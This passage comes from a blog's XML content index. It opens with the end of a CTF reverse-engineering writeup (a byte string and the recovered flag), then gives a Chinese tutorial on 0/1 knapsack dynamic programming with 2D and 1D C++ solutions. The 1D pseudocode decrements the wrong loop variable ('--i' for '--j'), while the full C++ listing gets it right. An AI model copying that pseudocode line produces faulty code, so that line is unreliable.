class="number">&#x27;l</span>\x0b\xa6b\x82\xc8&lt;g\x08B\x10r6\x1b\x9c\xd8v;\x86\xb7\x0e\xc6T\x82\x1e<span class="string">&quot;U\x1buP\x95\xba&#x27;</span></span><br><span class="line"><span class="string"># ... 略 ...</span></span><br></pre></td></tr></table></figure><p>得到flag为:</p><p><code>GWHT&#123;th1s_gam3_1s_s0_c00l_and_d&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>背包问题</title>
      <link href="/202482f8daf7b803/"/>
      <url>/202482f8daf7b803/</url>
      
        <content type="html"><![CDATA[<h1 id="背包问题">背包问题</h1><p>常见的背包问题如下:</p><ul><li>01背包:每个物品只有一个</li><li>完全背包:每个物品数量无限</li><li>多重背包:不同物品数量不同</li></ul><h1 id="01背包">01背包</h1><h2 id="题目描述">题目描述:</h2><p>有N件物品和一个最多能承受重量为W的背包，第i件物品的重量是weight[i]，得到的价值是value[i]，每件物品只能用一次，求解将哪些物品装入背包后物品价值的总和最大？</p><h2 id="问题分析">问题分析:</h2><p>标准的01背包问题,首先可以尝试使用暴力方法解决:</p><p>每个物品都有2种选择:要么不选取,要么选取,使用0或1来表示这两种状态,因此得名<code>01背包</code></p><p>对每个物品的2种选择会导致不同的效果,因此可以使用回溯法来搜索所有的情况,时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mi>n</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(2^n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>,n为物品数量.</p><p>这个时间复杂度是无法接受的,下面分析使用动态规划解决.</p><h3 id="二维dp解法">二维DP解法</h3><p>背包问题,涉及背包的大小和物品的选取以及重量和价值.</p><p>对第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>个物品而言,需要考虑当前背包是否能放下该物品,即背包当前剩余的容量要大于等于该物品的重量weight[i].</p><p>为同时考虑背包大小和物品数量及选取,我们使用二维数组<code>dp[][]</code>,其中<code>dp[i][j]</code>表示将前<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>件物品(不一定全部都选择)装进大小(限重)为j的背包所能获得的<code>最大价值</code>.</p><p>根据动态规划的思想,我们在考虑状态<code>[i,j]</code>(因为这里是二维DP)时,只假设前<code>[i-1,j]</code>,<code>[i,j-1]</code>等等所有状态均已求出最优解,而无需关心如何纠结求解,只是假设已经获得该状态.</p><p>那么对于求解这里当前的<code>dp[i][j]</code>,有如下2种情况:</p><ol><li>如果不选择物品<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>,那么<code>dp[i][j]</code>就等于使用前<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>个物品来装大小为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>的背包的最大价值,即<code>dp[i-1][j]</code></li><li>如果选择物品<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>,那么就要保证背包<code>至少</code>还能够装下该物品,即背包<code>已装满</code>的重量<code>至多</code>需为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>j</mi><mo>−</mo><mi>w</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(j-weight[i])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span>,<code>dp[i][j]</code>就等于使用前<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>个物品来装大小为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>j</mi><mo>−</mo><mi>w</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(j-weight[i])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span>的背包的最大价值,再加上当前物品<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>的价值<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">value[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span></span></span></span>,即<code>dp[i-1][j-weight[i]]+value[i]</code></li></ol><p>注意情况2中,由于显然我们知道,无论如何,想要总价值最大,那么背包的容量自然越大越好,所以说&quot;背包<code>已装满</code>的重量至多需为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>j</mi><mo>−</mo><mi>w</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(j-weight[i])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span>&quot;,也就是说将物品<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>放入后,恰好放满,此时背包利用率为100%,显然总价值最高(注意此时与物品的性价比无关).</p><p>上面的2种情况均能计算出一个价值,因此最终的<code>dp[i][j]</code>取二者的max值,这即为状态转移方程:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mi>w</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">]</mo><mo>+</mo><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">dp[i][j]=max(dp[i-1][j],dp[i-1][j-weight[i]]+value[i])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mopen">(</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span></span></p><br><p>再考虑初始条件:</p><ol><li><p>当背包大小为0时,选取任何物品的总价值自然为0,即<code>dp[i][0]</code>全部为0</p></li><li><p>当选取第一个物品时,装不下该物品的背包<code>dp[0][0-(wight[0]-1)]</code>均为0,其他能装下<code>dp[0][wight[0]-W]</code>的均为value[0]</p></li><li><p>事实上根据状态转移方程得知,各数值均从左上角推导得来,所以其余元素可以不初始化,不过默认初始化为0也可(注意求max最好用0填充)</p></li></ol><br><p>最后就是二重循环的遍历顺序,究竟是先(外层)遍历物品,还是先遍历背包大小.</p><p>事实上2种写法均可,根据状态转移方程可知并不影响递推计算.但是二者意义不同.</p><p>先遍历物品再遍历背包大小比较容易理解.</p><ul><li><p>遍历物品优先:</p><p>在这种方式下,外层循环遍历物品,内层循环遍历背包容量.这样,对于每个物品,我们考虑其是否加入背包,然后更新所有可能的背包容量.</p></li><li><p>遍历背包大小优先:</p><p>在这种方式下,外层循环遍历背包容量,内层循环遍历物品,这样,对于每个背包容量,我们逐个考虑加入物品,然后更新所有可能的物品.</p></li></ul><br><p>C++代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 洛谷P1048 采药</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXM 1000</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">w</span><span class="params">(n + <span class="number">1</span>)</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">v</span><span class="params">(n + <span class="number">1</span>)</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&gt; dp(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; w[i] &gt;&gt; v[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = w[<span class="number">0</span>];i &lt;= m;++i) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][i] = v[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>;i &lt; n;++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>;j &lt;= m;++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &lt; w[i])</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i][j] = max(dp[i - <span class="number">1</span>][j], dp[i - <span class="number">1</span>][j - w[i]] + v[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; dp[n - <span class="number">1</span>][m];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一维dp优化">一维DP优化</h3><p>根据二维DP的状态转移方程可知,<code>dp[i][j]</code>的推导仅与<code>dp[i - 1][j]</code>和<code>dp[i - 1][j - w[i]]</code>,二者都在上一行,并且最终的答案仅在最后一行,无需关心前面的各行.</p><p>因此,很容易可以想到,将二维DP数组优化为仅有一行的一维数组,或者叫&quot;滚动数组&quot;.</p><p>我们直接用一维dp[],其中<code>dp[j]</code>(注意下标为j)代表容量为j的背包能获得的最大价值.</p><p>状态转移方程很简单,如下:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mi>w</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">]</mo><mo>+</mo><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">dp[j]=max(dp[j],dp[j-weight[i]]+value[i])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mopen">(</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span></span></p><br><p>至于初始化dp[],由于状态转移方程使用max,又因为价值都是正数,因此全部初始化为0.</p><br><p>与二维不同,一维优化的遍历顺序完全不同,(伪)代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=m;j&gt;=weight[i];--i)&#123;</span><br><span class="line">        dp[j]=max(dp[j],dp[j-weight[i]]+value[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一维DP中,背包容量必须从大到小遍历,否则就会导致物品<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>被重复加入多次(考虑物品<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>的重量为1,价值为15,正序遍历对dp[1],dp[2]的影响—计算dp[2]时,该物品被加入了2次,错误).</p><p>换句话说,如果顺序遍历,使用当前物品更新各状态时,各状态(当前行各元素)会发生<code>重叠</code>,导致求解错误.</p><p>而二维DP中,每一行都是由上一层计算得来,不会影响本层.</p><br><p>另一方面,必须是先遍历物品在外,然后再遍历背包大小在内.如果背包大小在外层,那么每个dp[j]就只会放入一个物品(注意理解dp[j]的定义).</p><p>C++代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 洛谷P1048 采药</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXM 1000</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">w</span><span class="params">(n + <span class="number">1</span>)</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">v</span><span class="params">(n + <span class="number">1</span>)</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">dp</span><span class="params">(m + <span class="number">1</span>, <span class="number">0</span>)</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; w[i]&gt;&gt;v[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 两个for循环的顺序不可以颠倒!</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = m;j &gt;= w[i];--j) &#123;</span><br><span class="line">            dp[j] = max(dp[j], dp[j - w[i]] + v[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; dp[m];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="01背包-剩余空间最小问题">01背包-剩余空间最小问题</h1><h2 id="题目描述">题目描述:</h2><p>有N件物品和一个最多能装体积为W的背包，第i件物品的体积为w[i],求解将哪些物品装入背包后,背包剩余空间最小,输出该最小值.</p><h2 id="问题分析">问题分析:</h2><p>与01背包不同,此时求解的不再是价值,而是仅考虑能否装下,求解最小的剩余空间,也就是要求如何能够装下最大体积的物品.需要注意的是,本题不能使用贪心,很容易举出反例.</p><p>根据分析,我们将问题转化为&quot;如何使装入体积最大&quot;,最后用总体积减去该最大体积即可.</p><p><code>事实上</code>,该问题某种程度上可以理解为此时的value[]就是weight[],因此与常规01背包的区别仅仅是将v[]直接用w[]替换,并用m减去最终结果即可,其他完全相同!</p><p>下面的推理完全类似于01背包:</p><h3 